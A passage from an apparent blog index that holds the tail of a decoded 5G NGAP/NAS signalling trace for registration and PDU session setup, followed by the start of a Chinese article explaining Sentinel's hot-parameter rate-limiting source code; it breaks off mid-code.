maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n1 (0) beamReportTiming scs-30kHz: sym28 (3) beamManagementSSB-CSI-RS maxNumberSSB-CSI-RS-ResourceOneTx: n8 (1) maxNumberCSI-RS-Resource: n0 (0) maxNumberCSI-RS-ResourceTwoTx: n0 (0) maxNumberAperiodicCSI-RS-Resource: n4 (2) codebookParameters type1 singlePanel supportedCSI-RS-ResourceList: 1 item Item 0 SupportedCSI-RS-Resource maxNumberTxPortsPerResource: p16 (4) maxNumberResourcesPerBand: 8 totalNumberTxPortsPerBand: 16 modes: mode1andMode2 (1) maxNumberCSI-RS-PerResourceSet: 8 csi-RS-IM-ReceptionForFeedback maxConfigNumberNZP-CSI-RS-PerCC: 8 maxConfigNumberPortsAcrossNZP-CSI-RS-PerCC: 16 maxConfigNumberCSI-IM-PerCC: n4 (2) maxNumberSimultaneousNZP-CSI-RS-PerCC: 4 totalNumberPortsSimultaneousNZP-CSI-RS-PerCC: 16 csi-ReportFramework maxNumberPeriodicCSI-PerBWP-ForCSI-Report: 1 maxNumberAperiodicCSI-PerBWP-ForCSI-Report: 1 maxNumberSemiPersistentCSI-PerBWP-ForCSI-Report: 0 maxNumberPeriodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-PerBWP-ForBeamReport: 1 maxNumberAperiodicCSI-triggeringStatePerCC: n15 (2) maxNumberSemiPersistentCSI-PerBWP-ForBeamReport: 0 simultaneousCSI-ReportsPerCC: 2 csi-RS-ForTracking maxBurstLength: 2 maxSimultaneousResourceSetsPerCC: 2 maxConfiguredResourceSetsPerCC: 16 maxConfiguredResourceSetsAllCC: 32 multipleTCI: supported (0) bwp-SameNumerology: upto4 (1) pusch-256QAM: supported (0) ue-PowerClass: pc2 (1) channelBWs-DL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] channelBWs-UL-v1530: fr1 (0) fr1 scs-15kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] scs-60kHz: 0000 [bit length 10, 6 LSB pad bits, 0000 0000 00.. .... decimal value 0] supportedBandCombinationList: 1 item Item 0 BandCombination bandList: 1 item Item 0 BandParameters: nr (1) nr bandNR: 41 ca-BandwidthClassDL-NR: a (0) ca-BandwidthClassUL-NR: a (0) featureSetCombination: 0 powerClass-v1530: pc2 (0) appliedFreqBandListFilter: 1 item Item 0 FreqBandInformation: bandInformationNR (1) bandInformationNR bandNR: 41 supportedBandCombinationList-v1540: 1 item Item 0 BandCombination-v1540 bandList-v1540: 1 item Item 0 BandParameters-v1540 srs-TxSwitch supportedSRS-TxPortSwitch: t2r4 (2) measAndMobParameters measAndMobParametersCommon ssb-RLM: supported (0) eventB-MeasAndReport: supported (0) handoverFDD-TDD: supported (0) eutra-CGI-Reporting: supported (0) nr-CGI-Reporting: supported (0) periodicEUTRA-MeasAndReport: supported (0) measAndMobParametersXDD-Diff intraAndInterF-MeasAndReport: supported (0) eventA-MeasAndReport: supported (0) handoverInterF: supported (0) handoverLTE-EPC: supported (0) measAndMobParametersFRX-Diff ss-SINR-Meas: supported (0) handoverInterF: supported (0) handoverLTE-EPC: supported (0) featureSets featureSetsDownlink: 1 item Item 0 FeatureSetDownlink featureSetListPerDownlinkCC: 1 item Item 0 FeatureSetDownlinkPerCC-Id: 1 featureSetsDownlinkPerCC: 1 item Item 0 FeatureSetDownlinkPerCC supportedSubcarrierSpacingDL: kHz30 (1) supportedBandwidthDL: fr1 (0) fr1: mhz100 (10) channelBW-90mhz: supported (0) maxNumberMIMO-LayersPDSCH: fourLayers (1) supportedModulationOrderDL: qam256 (5) featureSetsUplink: 1 item Item 0 FeatureSetUplink featureSetListPerUplinkCC: 1 item Item 0 FeatureSetUplinkPerCC-Id: 1 supportedSRS-Resources maxNumberAperiodicSRS-PerBWP: n16 (4) maxNumberAperiodicSRS-PerBWP-PerSlot: 6 maxNumberPeriodicSRS-PerBWP: n16 (4) maxNumberPeriodicSRS-PerBWP-PerSlot: 6 maxNumberSemiPersistentSRS-PerBWP: n16 (4) maxNumberSemiPersistentSRS-PerBWP-PerSlot: 6 maxNumberSRS-Ports-PerResource: n2 (1) featureSetsUplinkPerCC: 1 item Item 0 FeatureSetUplinkPerCC supportedSubcarrierSpacingUL: kHz30 (1) supportedBandwidthUL: fr1 (0) fr1: mhz100 (10) channelBW-90mhz: supported (0) mimo-CB-PUSCH maxNumberMIMO-LayersCB-PUSCH: twoLayers (1) maxNumberSRS-ResourcePerSet: 1 supportedModulationOrderUL: qam256 (5) featureSetsDownlink-v1540: 1 item Item 0 FeatureSetDownlink-v1540 oneFL-DMRS-TwoAdditionalDMRS-DL: supported (0) twoFL-DMRS-TwoAdditionalDMRS-DL: supported (0) oneFL-DMRS-ThreeAdditionalDMRS-DL: supported (0) featureSetCombinations: 1 item Item 0 FeatureSetCombination: 1 item Item 0 FeatureSetsPerBand: 1 item Item 0 FeatureSet: nr (1) nr downlinkSetNR: 1 uplinkSetNR: 1 nonCriticalExtension interRAT-Parameters eutra supportedBandListEUTRA: 21 items Item 0 FreqBandIndicatorEUTRA: 1 Item 1 FreqBandIndicatorEUTRA: 2 Item 2 FreqBandIndicatorEUTRA: 3 Item 3 FreqBandIndicatorEUTRA: 4 Item 4 FreqBandIndicatorEUTRA: 5 Item 5 FreqBandIndicatorEUTRA: 6 Item 6 FreqBandIndicatorEUTRA: 7 Item 7 FreqBandIndicatorEUTRA: 8 Item 8 FreqBandIndicatorEUTRA: 9 Item 9 FreqBandIndicatorEUTRA: 12 Item 10 FreqBandIndicatorEUTRA: 17 Item 11 FreqBandIndicatorEUTRA: 18 Item 12 FreqBandIndicatorEUTRA: 19 Item 13 FreqBandIndicatorEUTRA: 20 Item 14 FreqBandIndicatorEUTRA: 26 Item 15 FreqBandIndicatorEUTRA: 28 Item 16 FreqBandIndicatorEUTRA: 34 Item 17 FreqBandIndicatorEUTRA: 38 Item 18 FreqBandIndicatorEUTRA: 39 Item 19 FreqBandIndicatorEUTRA: 40 Item 20 FreqBandIndicatorEUTRA: 41 eutra-ParametersCommon mfbi-EUTRA: supported (0) rs-SINR-MeasEUTRA: supported (0) eutra-ParametersXDD-Diff rsrqMeasWidebandEUTRA: supported (0) inactiveState: supported (0) 12345678910111213141516171819NGAP-PDU: successfulOutcome (1) successfulOutcome procedureCode: id-InitialContextSetup (14) criticality: reject (0) value InitialContextSetupResponse protocolIEs: 2 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: ignore (1) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: ignore (1) value RAN-UE-NGAP-ID: 4194571 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-UplinkNASTransport (46) criticality: ignore (1) value UplinkNASTransport protocolIEs: 4 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: reject (0) value NAS-PDU: 7e026e3a64f8017e0043 Non-Access-Stratum 5GS (NAS)PDU Security protected NAS 5GS message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0010 = Security header type: Integrity protected and ciphered (2) Message authentication code: 0x6e3a64f8 Sequence number: 1 Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Registration complete (0x43) Item 3: id-UserLocationInformation ProtocolIE-Field id: id-UserLocationInformation (121) criticality: ignore (1) value UserLocationInformation: userLocationInformationNR (1) userLocationInformationNR nR-CGI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) nRCellIdentity: 0x00044880f0 tAI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) tAC: 4388 (0x001124) 2.9 PDU session establishment request123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-UplinkNASTransport (46) criticality: ignore (1) value UplinkNASTransport protocolIEs: 4 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: reject (0) value NAS-PDU: 7e02dbf0810f027e006701001e2e050fc1ffff93a17b0013… Non-Access-Stratum 5GS (NAS)PDU Security protected NAS 5GS message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0010 = Security header type: Integrity protected and ciphered (2) Message authentication code: 0xdbf0810f Sequence number: 2 Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: UL NAS transport (0x67) 0000 .... = Spare Half Octet: 0 Payload container type .... 0001 = Payload container type: N1 SM information (1) Payload container Length: 30 Plain NAS 5GS Message Extended protocol discriminator: 5G session management messages (46) PDU session identity: PDU session identity value 5 (5) Procedure transaction identity: 15 Message type: PDU session establishment request (0xc1) Integrity protection maximum data rate Integrity protection maximum data rate for uplink: Full data rate (255) Integrity protection maximum data rate for downlink: Full data rate (255) PDU session type 1001 .... = Element ID: 0x9- .... 0011 = PDU session type: Ipv4v6 (3) SSC mode 1010 .... = Element ID: 0xa- .... 0001 = SSC mode: SSC mode 1 (1) Extended protocol configuration options Element ID: 0x7b Length: 19 [Link direction: MS to network (0)] 1... .... = Extension: True .... .000 = Configuration Protocol: PPP for use with IP PDP type or IP PDN type (0) Protocol or Container ID: IP address allocation via NAS signalling (0x000a) Length: 0x00 (0) Protocol or Container ID: IM CN Subsystem Signaling Flag (0x0002) Length: 0x00 (0) Protocol or Container ID: P-CSCF IPv6 Address Request (0x0001) Length: 0x00 (0) Protocol or Container ID: P-CSCF IPv4 Address Request (0x000c) Length: 0x00 (0) Protocol or Container ID: DNS Server IPv6 Address Request (0x0003) Length: 0x00 (0) Protocol or Container ID: DNS Server IPv4 Address Request (0x000d) Length: 0x00 (0) PDU session identity 2 - PDU session ID Element ID: 0x12 PDU session identity: PDU session identity value 5 (5) Request type 1000 .... = Element ID: 0x8- .... 0001 = Request type: Initial request (1) DNN Element ID: 0x25 Length: 4 DNN: ims Item 3: id-UserLocationInformation ProtocolIE-Field id: id-UserLocationInformation (121) criticality: ignore (1) value UserLocationInformation: userLocationInformationNR (1) userLocationInformationNR nR-CGI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) nRCellIdentity: 0x00044880f0 tAI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) tAC: 4388 (0x001124) 2.10 PDUSessionResourceSetupRequest PDU session establishment accept123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-PDUSessionResourceSetup (29) criticality: reject (0) value PDUSessionResourceSetupRequest protocolIEs: 4 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-PDUSessionResourceSetupListSUReq ProtocolIE-Field id: id-PDUSessionResourceSetupListSUReq (74) criticality: reject (0) value PDUSessionResourceSetupListSUReq: 1 item Item 0 PDUSessionResourceSetupItemSUReq pDUSessionID: 5 pDUSessionNAS-PDU: 7e02663fcf8d027e00680100742e050fc211000901000631… Non-Access-Stratum 5GS (NAS)PDU Security protected NAS 5GS message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0010 = Security header type: Integrity protected and ciphered (2) Message authentication code: 0x663fcf8d Sequence number: 2 Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: DL NAS transport (0x68) 0000 .... = Spare Half Octet: 0 Payload container type .... 0001 = Payload container type: N1 SM information (1) Payload container Length: 116 Plain NAS 5GS Message Extended protocol discriminator: 5G session management messages (46) PDU session identity: PDU session identity value 5 (5) Procedure transaction identity: 15 Message type: PDU session establishment accept (0xc2) 0001 .... = Selected SSC mode: SSC mode 1 (1) PDU session type - Selected PDU session type .... 0001 = PDU session type: IPv4 (1) QoS rules - Authorized QoS rules Length: 9 QoS rule 1 QoS rule identifier: 1 Length: 6 001. .... = Rule operation code: Create new QoS rule (1) ...1 .... = DQR: The QoS rule is the default QoS rule .... 0001 = Number of packet filters: 1 Packet filter 1 ..11 .... = Packet filter direction: Bidirectional (3) .... 0000 = Packet filter identifier: 0 Length: 1 Packet filter component 1 Packet filter component type: Match-all type (1) QoS rule precedence: 254 0... .... = Spare: 0 .0.. .... = Spare: 0 ..00 0001 = Qos flow identifier: 1 Session-AMBR Length: 6 Unit for Session-AMBR for downlink: value is incremented in multiples of 1 Mbps (6) Session-AMBR for downlink: 2001 Mbps (2001) Unit for Session-AMBR for uplink: value is incremented in multiples of 1 Mbps (6) Session-AMBR for uplink: 2000 Mbps (2000) PDU address Element ID: 0x29 Length: 5 .... 0001 = PDU session type: IPv4 (1) PDU address information: 222.222.1.231 S-NSSAI Element ID: 0x22 Length: 4 Slice/service type (SST): 1 Slice differentiator (SD): 1 Mapped EPS bearer contexts Element ID: 0x75 Length: 27 Mapped EPS bearer context 1 0101 .... = EPS bearer identity: 5 Length: 24 01.. .... = Operation code: Create new EPS bearer (1) ..0. .... = Spare: 0 ...1 .... = E bit: parameters list is included (1) .... 0010 = Number of EPS parameters: 2 EPS parameter 1 - Mapped EPS QoS parameters EPS parameter 2 - APN-AMBR QoS flow descriptions - Authorized Extended protocol configuration options Element ID: 0x7b Length: 27 [Link direction: Network to MS (1)] 1... .... = Extension: True .... .000 = Configuration Protocol: PPP for use with IP PDP type or IP PDN type (0) Protocol or Container ID: P-CSCF IPv6 Address (0x0001) Length: 0x10 (16) IPv6: :: Protocol or Container ID: P-CSCF IPv4 Address (0x000c) Length: 0x04 (4) IPv4: 16.16.16.220 DNN Element ID: 0x25 Length: 6 DNN: cmnet PDU session identity 2 - PDU session ID Element ID: 0x12 PDU session identity: PDU session identity value 5 (5) s-NSSAI sST: 01 sD: 000001 pDUSessionResourceSetupRequestTransfer: 0000050082000a0c7744d6403077359400008b000a01f010… PDUSessionResourceSetupRequestTransfer protocolIEs: 5 items Item 0: id-PDUSessionAggregateMaximumBitRate ProtocolIE-Field id: id-PDUSessionAggregateMaximumBitRate (130) criticality: reject (0) value PDUSessionAggregateMaximumBitRate pDUSessionAggregateMaximumBitRateDL: 2001000000bits/s pDUSessionAggregateMaximumBitRateUL: 2000000000bits/s Item 1: id-UL-NGU-UP-TNLInformation ProtocolIE-Field id: id-UL-NGU-UP-TNLInformation (139) criticality: reject (0) value UPTransportLayerInformation: gTPTunnel (0) gTPTunnel transportLayerAddress: 10100d71 [bit length 32, 0001 0000 0001 0000 0000 1101 0111 0001 decimal value 269487473] TransportLayerAddress (IPv4): 16.16.13.113 gTP-TEID: 00c00178 Item 2: id-PDUSessionType ProtocolIE-Field id: id-PDUSessionType (134) criticality: reject (0) value PDUSessionType: ipv4 (0) Item 3: id-SecurityIndication ProtocolIE-Field id: id-SecurityIndication (138) criticality: reject (0) value SecurityIndication integrityProtectionIndication: required (0) confidentialityProtectionIndication: required (0) maximumIntegrityProtectedDataRate-UL: maximum-UE-rate (1) Item 4: id-QosFlowSetupRequestList ProtocolIE-Field id: id-QosFlowSetupRequestList (136) criticality: reject (0) value QosFlowSetupRequestList: 1 item Item 0 QosFlowSetupRequestItem qosFlowIdentifier: 1 qosFlowLevelQosParameters qosCharacteristics: nonDynamic5QI (0) nonDynamic5QI fiveQI: 9 allocationAndRetentionPriority priorityLevelARP: 10 pre-emptionCapability: may-trigger-pre-emption (1) pre-emptionVulnerability: not-pre-emptable (0) e-RAB-ID: 5 Item 3: id-UEAggregateMaximumBitRate ProtocolIE-Field id: id-UEAggregateMaximumBitRate (110) criticality: ignore (1) value UEAggregateMaximumBitRate uEAggregateMaximumBitRateDL: 256bits/s uEAggregateMaximumBitRateUL: 1024bits/s 2.11 PDUSessionResourceSetupResponse12345678910111213141516171819202122232425262728293031323334353637383940NGAP-PDU: successfulOutcome (1) successfulOutcome procedureCode: id-PDUSessionResourceSetup (29) criticality: reject (0) value PDUSessionResourceSetupResponse protocolIEs: 3 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: ignore (1) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: ignore (1) value RAN-UE-NGAP-ID: 4194571 Item 2: id-PDUSessionResourceSetupListSURes ProtocolIE-Field id: id-PDUSessionResourceSetupListSURes (75) criticality: ignore (1) value PDUSessionResourceSetupListSURes: 1 item Item 0 PDUSessionResourceSetupItemSURes pDUSessionID: 5 pDUSessionResourceSetupResponseTransfer: 0003e00a0a0ac8800c01240001 PDUSessionResourceSetupResponseTransfer dLQosFlowPerTNLInformation uPTransportLayerInformation: gTPTunnel (0) gTPTunnel transportLayerAddress: 0a0a0ac8 [bit length 32, 0000 1010 0000 1010 0000 1010 1100 1000 decimal value 168430280] TransportLayerAddress (IPv4): 10.10.10.200 gTP-TEID: 800c0124 associatedQosFlowList: 1 item Item 0 AssociatedQosFlowItem qosFlowIdentifier: 1","categories":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/categories/5G/"}],"tags":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/tags/5G/"}]},{"title":"Sentinel热点参数限流原理","slug":"framework/sentinel/Sentinel热点参数限流原理","date":"2023-11-15T03:40:25.012Z","updated":"2023-11-15T03:40:25.012Z","comments":true,"path":"2023/11/15/framework/sentinel/Sentinel热点参数限流原理/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/framework/sentinel/Sentinel%E7%83%AD%E7%82%B9%E5%8F%82%E6%95%B0%E9%99%90%E6%B5%81%E5%8E%9F%E7%90%86/","excerpt":"","text":"Sentinel热点参数限流原理何为热点热点即经常访问的数据。很多时候我们希望统计某个热点数据中访问频次最高的 Top K 数据，并对其访问进行限制，比如： 商品 ID 为参数，统计一段时间内最常购买的商品 ID 并进行限制 用户 ID 为参数，针对一段时间内频繁访问的用户 ID 进行限制 如何使用1.引入依赖1234567891011&lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-core&lt;/artifactId&gt; &lt;version&gt;$&#123;sentinel.version&#125;&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 热点参数限流 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-parameter-flow-control&lt;/artifactId&gt; &lt;version&gt;$&#123;sentinel.version&#125;&lt;/version&gt;&lt;/dependency&gt; 2.定义ParamFlowRule123456789101112131415private static void loadRules() &#123; ParamFlowRule rule = new ParamFlowRule(RESOURCE_KEY) .setParamIdx(0) // 指定当前 rule 对应的热点参数索引 .setGrade(RuleConstant.FLOW_GRADE_QPS) // 限流的维度，该策略针对 QPS 限流 .setDurationInSec(1) // 限流的单位时间 .setCount(50) // 未使用指定热点参数时，该资源限流大小为50 .setParamFlowItemList(new ArrayList&lt;&gt;()); // item1 设置了对 goods_id = goods_uuid1 的限流，单位时间（DurationInSec）内只能访问10次 ParamFlowItem item1 = new ParamFlowItem().setObject(&quot;goods_uuid1&quot;) // 热点参数 value .setClassType(String.class.getName()) // 热点参数数据类型 .setCount(10); // 针对该value的限流值 ParamFlowRuleManager.loadRules(Collections.singletonList(rule));&#125; 这里的配置属性后文讲源码的时候都会看到，所以要重点关注一下 Rule 本身可以定义一个限流阈值，每个热点参数也可以定义自己的限流阈值 还可以为限流阀值设置一个单位时间 3.调用12345678910111213try &#123; // 调用限流 entry = SphU.entry(RESOURCE_KEY, EntryType.IN, 1, hotParamValue); // 业务代码...&#125; catch (BlockException e) &#123; // 当前请求被限流 e.printStackTrace();&#125; finally &#123; if (entry != null) &#123; entry.exit(1, hotParamValue); &#125;&#125; 完整实例参考DEMO 之前有用过 Sentinel 的同学的话其实很好理解。配置方面的话 Rule 属性有些不同，调用方面，需要添加上本次调用相关的参数举个例子，我们配置了对商品 ID = 1 的限流规则，每次请求商品接口之前调用 Sentinel 的限流 API，指定 Resource 并传入当前要访问的商品ID。如果 Sentinel 能找到 Resource 对应的 Rule，则根据 Rule 进行限流。Rule 中如果找到 arg 对应的热点参数配置，则使用热点参数的阈值进行限流。找不到的话，则使用Rule 中的阈值。 实现原理Sentinel 整体采用了责任链的设计模式（类似 Servlet Filter），每次调用 SphU.entry 时，都会经历一系列功能插槽（slot chain）。不同的 Slot 职责不同，有的是负责收集信息，有的是负责根据不同的算法策略进行熔断限流操作，关于整体流程大家可以阅读下 官网中对 Sentinel 工作流程的介绍。 ParamFlowSlot关于热点参数限流的逻辑在 com.alibaba.csp.sentinel.slots.block.flow.param.ParamFlowSlot 中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263public class ParamFlowSlot extends AbstractLinkedProcessorSlot&lt;DefaultNode&gt; &#123; @Override public void entry(Context context, ResourceWrapper resourceWrapper, DefaultNode node, int count, boolean prioritized, Object... args) throws Throwable &#123; // ParamFlowManager 中没有对应的 Rule，则执行下一个Slot if (!ParamFlowRuleManager.hasRules(resourceWrapper.getName())) &#123; fireEntry(context, resourceWrapper, node, count, prioritized, args); return; &#125; // 限流检查 checkFlow(resourceWrapper, count, args); // 执行下一个Slot fireEntry(context, resourceWrapper, node, count, prioritized, args); &#125; @Override public void exit(Context context, ResourceWrapper resourceWrapper, int count, Object... args) &#123; // 执行下一个Slot fireExit(context, resourceWrapper, count, args); &#125; void applyRealParamIdx(/*@NonNull*/ ParamFlowRule rule, int length) &#123; int paramIdx = rule.getParamIdx(); if (paramIdx &lt; 0) &#123; if (-paramIdx &lt;= length) &#123; rule.setParamIdx(length + paramIdx); &#125; else &#123; // Illegal index, give it a illegal positive value, latter rule checking will pass. rule.setParamIdx(-paramIdx); &#125; &#125; &#125; void checkFlow(ResourceWrapper resourceWrapper, int count, Object... args) throws BlockException &#123; if (args == null) &#123; return; &#125; if (!ParamFlowRuleManager.hasRules(resourceWrapper.getName())) &#123; return; &#125; // 获取 resource 对应的全部 ParamFlowRule List&lt;ParamFlowRule&gt; rules = ParamFlowRuleManager.getRulesOfResource(resourceWrapper.getName()); for (ParamFlowRule rule : rules) &#123; applyRealParamIdx(rule, args.length); // 初始化该 Rule 需要的限流指标数据 ParameterMetricStorage.initParamMetricsFor(resourceWrapper, rule); // 如果不满足某个 Rule 则抛出异常，代表当前请求被限流 if (!ParamFlowChecker.passCheck(resourceWrapper, rule, count, args)) &#123; String triggeredParam = &quot;&quot;; if (args.length &gt; rule.getParamIdx()) &#123; Object value = args[rule.getParamIdx()]; triggeredParam = String.valueOf(value); &#125; throw new ParamFlowException(resourceWrapper.getName(), triggeredParam, rule); &#125; &#125; &#125;&#125; ParamFlowSlot 中代码不多，也没做什么事。参考注释的话应该很好理解。咱们直接挑干的讲，来看下 ParamFlowChecker 中是如何实现限流的 ParamFlowChecker数据结构热点参数限流使用的算法为令牌桶算法，首先来看一下数据结构是如何存储的 123456789101112131415161718192021public class ParameterMetric &#123; /** * Format: (rule, (value, timeRecorder)) * * @since 1.6.0 */ private final Map&lt;ParamFlowRule, CacheMap&lt;Object, AtomicLong&gt;&gt; ruleTimeCounters = new HashMap&lt;&gt;(); /** * Format: (rule, (value, tokenCounter)) * * @since 1.6.0 */ private final Map&lt;ParamFlowRule, CacheMap&lt;Object, AtomicLong&gt;&gt; ruleTokenCounter = new HashMap&lt;&gt;(); private final Map&lt;Integer, CacheMap&lt;Object, AtomicInteger&gt;&gt; threadCountMap = new HashMap&lt;&gt;(); // 省略... &#125; Sentinel 中 Resource 代表当前要访问的资源（方法或者api接口），一个 Resource 可以对应多个 Rule，这些 Rule 可以是相同的 class。现在再来看 ParameterMetric 的结构，每个 Resource 对应一个 ParameterMetric 对象，上述 CacheMap&lt;Object, AtomicLong&gt; 的 Key代表热点参数的值，Value 则是对应的计数器。所以这里数据结构的关系是这样的 一个 Resource 有一个 ParameterMetric 一个 ParameterMetric 统计了多个 Rule 所需要的限流指标数据 每个 Rule 又可以配置多个热点参数 CacheMap 的默认实现，包装了 com.googlecode.concurrentlinkedhashmap.ConcurrentLinkedHashMap使用该类的主要原因是为了实现热点参数的 LRU 详细解释一下，这三个变量 ruleTimeCounters ：记录令牌桶的最后添加时间，用于 QPS 限流 ruleTokenCounter ：记录令牌桶的令牌数量，用于 QPS 限流 threadCountMap ：用于线程级别限流，这个其实和令牌桶算法没有关系了，线程限流只是在 Rule中定义了最大线程数，请求时判断一下当前的线程数是否大于最大线程，具体的应用在 ParamFlowChecker#passSingleValueCheck 实际使用 ParameterMetric 时，使用 ParameterMetricStorage 获取 Resource 对应的 ParameterMetric 12345public final class ParameterMetricStorage &#123; // Format (Resource, ParameterMetric) private static final Map&lt;String, ParameterMetric&gt; metricsMap = new ConcurrentHashMap&lt;&gt;(); // 省略相关代码 &#125; ParamFlowChecker执行逻辑ParamFlowChecker 中 QPS 级限流支持两种策略 CONTROL_BEHAVIOR_RATE_LIMITER ：请求速率限制，对应的方法ParamFlowChecker#passThrottleLocalCheck DEFAULT ：只要桶中还有令牌，就可以通过，对应的方法ParamFlowChecker#passDefaultLocalCheck 接下来我们将以 passDefaultLocalCheck 为例，进行分析。但是在这之前，先来捋一下，从 ParamFlowSlot#checkFlow 到ParamFlowChecker#passDefaultLocalCheck 这中间都经历了什么，详见 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// 伪代码，忽略了一些参数传递checkFlow() &#123; // if 没有对应的 rule，跳出 ParamFlowSlot 逻辑 // if args == null，跳出 ParamFlowSlot 逻辑 List&lt;ParamFlowRule&gt; rules = ParamFlowRuleManager.getRulesOfResource(resourceWrapper.getName()); rules.forEach(r -&gt; &#123; // 初始化该 Rule 需要的限流指标数据 ParameterMetricStorage.initParamMetricsFor(resourceWrapper, rule); if (!ParamFlowChecker.passCheck(resourceWrapper, rule, count, args)) &#123; // 抛出限流异常 &#125; &#125;)&#125;passCheck() &#123; // 从 args 中获取本次限流需要使用的 value int paramIdx = rule.getParamIdx(); Object value = args[paramIdx]; // 根据 rule 判断是该请求使用集群限流还是本地限流 if (rule.isClusterMode() &amp;&amp; rule.getGrade() == RuleConstant.FLOW_GRADE_QPS) &#123; return passClusterCheck(resourceWrapper, rule, count, value); &#125; return passLocalCheck(resourceWrapper, rule, count, value);&#125;passLocalCheck() &#123; // 如果 value 是 Collection 或者 Array // Sentinel 认为这一组数据都需要经过热点参数限流校验 // 遍历所有值调用热点参数限流校验 if (isCollectionOrArray(value)) &#123; value.forEach(v -&gt; &#123; // 当数组中某个 value 无法通过限流校验时，return false 外部会抛出限流异常 if (!passSingleValueCheck(resourceWrapper, rule, count, param)) &#123; return false; &#125; &#125;) &#125;&#125;passSingleValueCheck() &#123; if (rule.getGrade() == RuleConstant.FLOW_GRADE_QPS) &#123; if (rule.getControlBehavior() == RuleConstant.CONTROL_BEHAVIOR_RATE_LIMITER) &#123; // 速率限制 return passThrottleLocalCheck(resourceWrapper, rule, acquireCount, value); &#125; else &#123; // 默认限流 return passDefaultLocalCheck(resourceWrapper, rule, acquireCount, value); &#125; &#125; else if (rule.getGrade() == RuleConstant.FLOW_GRADE_THREAD) &#123; // 线程级限流逻辑 &#125;&#125; 上面提到了一个集群限流，和上一篇中说到的集群限流实现原理是一样的，选出一台 Server 来做限流决策，所有客户端的限流请求都咨询Server，由 Server 来决定。由于不是本文重点，就不多说了。 ParamFlowChecker限流核心代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586static boolean passDefaultLocalCheck(ResourceWrapper resourceWrapper, ParamFlowRule rule, int acquireCount, Object value) &#123; // 根据 resource 获取 ParameterMetric ParameterMetric metric = 